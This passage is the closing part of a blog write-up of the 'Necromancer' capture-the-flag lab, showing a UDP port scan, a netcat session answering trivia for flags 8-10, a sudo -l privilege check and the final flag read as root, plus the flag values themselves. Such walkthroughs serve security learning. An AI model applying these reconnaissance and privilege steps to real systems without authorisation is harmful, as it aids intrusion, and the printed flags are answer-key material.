class="line"></span><br><span class="line">Defend yourself!  Counter attack the Necromancer&apos;s spells at u777!</span><br></pre></td></tr></table></figure>
<p>Well, just when I thought we were on the offensive we are forced to parry. We log out and check:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# nmap -sU -p 777 10.0.2.10</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2017-12-17 13:59 CEST</span><br><span class="line">Nmap scan report for 10.0.2.10</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE         SERVICE</span><br><span class="line">777/udp open|filtered multiling-http</span><br><span class="line">MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds</span><br><span class="line"></span><br><span class="line">root@kali:~/ctf/necromancer# netcat -ul -p 777</span><br></pre></td></tr></table></figure>
<h3 id="Flags-8-10-An-intense-battle"><a href="#Flags-8-10-An-intense-battle" class="headerlink" title="Flags 8-10: An intense battle"></a>Flags 8-10: An intense battle</h3><p>UDP Port 777 is neither open on the Necromancer’s machine nor are we contacted on said port. That means we will fight at the Necromancer own battlefield an log back in:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">$ nc -O 30 -u localhost 777</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">** You only have 3 hitpoints left! **</span><br><span class="line"></span><br><span class="line">Defend yourself from the Necromancer&apos;s Spells!</span><br><span class="line"></span><br><span class="line">Where do the Black Robes practice magic of the Greater Path?  Kelewan</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag8&#123;55a6af2ca3fee9f2fef81d20743bda2c&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">** You only have 3 hitpoints left! **</span><br><span class="line"></span><br><span class="line">Defend yourself from the Necromancer&apos;s Spells!</span><br><span class="line"></span><br><span class="line">Who did Johann Faust VIII make a deal with?  Devil</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">** You only have 2 hitpoints left! **</span><br><span class="line"></span><br><span class="line">Defend yourself from the Necromancer&apos;s Spells!</span><br><span class="line"></span><br><span class="line">Who did Johann Faust VIII make a deal with?  Mephistopheles</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag9&#123;713587e17e796209d1df4c9c2c2d2966&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">** You only have 2 hitpoints left! **</span><br><span class="line"></span><br><span class="line">Defend yourself from the Necromancer&apos;s Spells!</span><br><span class="line"></span><br><span class="line">Who is tricked into passing the Ninth Gate?  Hedge</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag10&#123;8dc6486d2c63cafcdc6efbba2be98ee4&#125;</span><br><span class="line"></span><br><span class="line">A great flash of light knocks you to the ground; momentarily blinding you!</span><br><span class="line"></span><br><span class="line">As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.</span><br><span class="line"></span><br><span class="line">An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.</span><br><span class="line"></span><br><span class="line">The room is silent.</span><br><span class="line"></span><br><span class="line">You walk over to where the Necromancer once stood.</span><br><span class="line"></span><br><span class="line">On the ground is a small vile.</span><br></pre></td></tr></table></figure>
<h3 id="Last-Flag-The-strength-to-win"><a href="#Last-Flag-The-strength-to-win" class="headerlink" title="Last Flag: The strength to win"></a>Last Flag: The strength to win</h3><p>We survived due to the help of Wikipedia (I do admit that I failed this challenge at first, resulting in a complete reset of the Necromancer VM). The Necromancer is gone and the vile is our only hint.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ ls -la</span><br><span class="line">total 44</span><br><span class="line">drwxr-xr-x  3 demonslayer  demonslayer  512 Sep 13 11:14 .</span><br><span class="line">drwxr-xr-x  3 root         wheel        512 May 11  2016 ..</span><br><span class="line">-rw-r--r--  1 demonslayer  demonslayer   87 May 11  2016 .Xdefaults</span><br><span class="line">-rw-r--r--  1 demonslayer  demonslayer  773 May 11  2016 .cshrc</span><br><span class="line">-rw-r--r--  1 demonslayer  demonslayer  103 May 11  2016 .cvsrc</span><br><span class="line">-rw-r--r--  1 demonslayer  demonslayer  359 May 11  2016 .login</span><br><span class="line">-rw-r--r--  1 demonslayer  demonslayer  175 May 11  2016 .mailrc</span><br><span class="line">-rw-r--r--  1 demonslayer  demonslayer  218 May 11  2016 .profile</span><br><span class="line">-rw-r--r--  1 demonslayer  demonslayer  196 Sep 13 11:02 .smallvile</span><br><span class="line">drwx------  2 demonslayer  demonslayer  512 May 11  2016 .ssh</span><br><span class="line">-rw-r--r--  1 demonslayer  demonslayer  706 May 11  2016 flag8.txt</span><br><span class="line">$ cat .smallvile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">You pick up the small vile.</span><br><span class="line"></span><br><span class="line">Inside of it you can see a green liquid.</span><br><span class="line"></span><br><span class="line">Opening the vile releases a pleasant odour into the air.</span><br><span class="line"></span><br><span class="line">You drink the elixir and feel a great power within your veins!</span><br></pre></td></tr></table></figure>
<p>We can literally feel that we are oozing power. There is a certain desire to know how far our new gained powers go:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line">Matching Defaults entries for demonslayer on thenecromancer:</span><br><span class="line">    env_keep+=&quot;FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK&quot;</span><br><span class="line"></span><br><span class="line">User demonslayer may run the following commands on thenecromancer:</span><br><span class="line">    (ALL) NOPASSWD: /bin/cat /root/flag11.txt</span><br></pre></td></tr></table></figure>
<p>Yeah, we are mighty enough to see the next flag on the horizon.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">$ sudo cat /root/flag11.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Suddenly you feel dizzy and fall to the ground!</span><br><span class="line"></span><br><span class="line">As you open your eyes you find yourself staring at a computer screen.</span><br><span class="line"></span><br><span class="line">Congratulations!!! You have conquered......</span><br><span class="line"></span><br><span class="line">          .                                                      .</span><br><span class="line">        .n                   .                 .                  n.</span><br><span class="line">  .   .dP                  dP                   9b                 9b.    .</span><br><span class="line"> 4    qXb         .       dX                     Xb       .        dXp     t</span><br><span class="line">dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb</span><br><span class="line">9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP</span><br><span class="line"> 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP</span><br><span class="line">  `9XXXXXXXXXXXXXXXXXXXXX&apos;~   ~`OOO8b   d8OOO&apos;~   ~`XXXXXXXXXXXXXXXXXXXXXP&apos;</span><br><span class="line">    `9XXXXXXXXXXXP&apos; `9XX&apos;          `98v8P&apos;          `XXP&apos; `9XXXXXXXXXXXP&apos;</span><br><span class="line">        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~</span><br><span class="line">                        )b.  .dbo.dP&apos;`v&apos;`9b.odb.  .dX(</span><br><span class="line">                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.</span><br><span class="line">                     dXXXXXXXXXXXP&apos;   .   `9XXXXXXXXXXXb</span><br><span class="line">                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb</span><br><span class="line">                    9XXb&apos;   `XXXXXb.dX|Xb.dXXXXX&apos;   `dXXP</span><br><span class="line">                     `&apos;      9XXXXXX(   )XXXXXXP      `&apos;</span><br><span class="line">                              XXXX X.`v&apos;.X XXXX</span><br><span class="line">                              XP^X&apos;`b   d&apos;`X^XX</span><br><span class="line">                              X. 9  `   &apos;  P )X</span><br><span class="line">                              `b  `       &apos;  d&apos;</span><br><span class="line">                               `             &apos;                       </span><br><span class="line">                               THE NECROMANCER!</span><br><span class="line">                                 by  @xerubus</span><br><span class="line"></span><br><span class="line">                   flag11&#123;42c35828545b926e79a36493938ab1b1&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Big shout out to Dook and Bull for being test bunnies.</span><br><span class="line"></span><br><span class="line">Cheers OJ for the obfuscation help.</span><br><span class="line"></span><br><span class="line">Thanks to SecTalks Brisbane and their sponsors for making these CTF challenges possible.</span><br><span class="line"></span><br><span class="line">&quot;=========================================&quot;</span><br><span class="line">&quot;  xerubus (@xerubus) - www.mogozobo.com  &quot;</span><br><span class="line">&quot;=========================================&quot;</span><br></pre></td></tr></table></figure>
<p>That’s it, we have conquered the Necromancer. That took quite some time, but it was time well spent as a learning experience packaged in an unusual story.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://erikgeiser.com/2017/12/necromancer/" data-id="cjkavxe430007r40iakiec82u" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2018/08/package-management-is-broken/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          Why Package Management is Broken on all Platforms
        
      </div>
    </a>
  
  
    <a href="/2017/03/nebula/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Nebula</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Opinion/">Opinion</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2018/08/package-management-is-broken/">Why Package Management is Broken on all Platforms</a>
          </li>
        
          <li>
            <a href="/2017/12/necromancer/">Necromancer</a>
          </li>
        
          <li>
            <a href="/2017/03/nebula/">Nebula</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2018 Erik Geiser<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/about-me" class="mobile-nav-link">About Me</a>
  
    <a href="/imprint" class="mobile-nav-link">Imprint</a>
  
    <a href="/privacy-policy" class="mobile-nav-link">Privacy Policy</a>
  
</nav>
    

<script src="/js/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>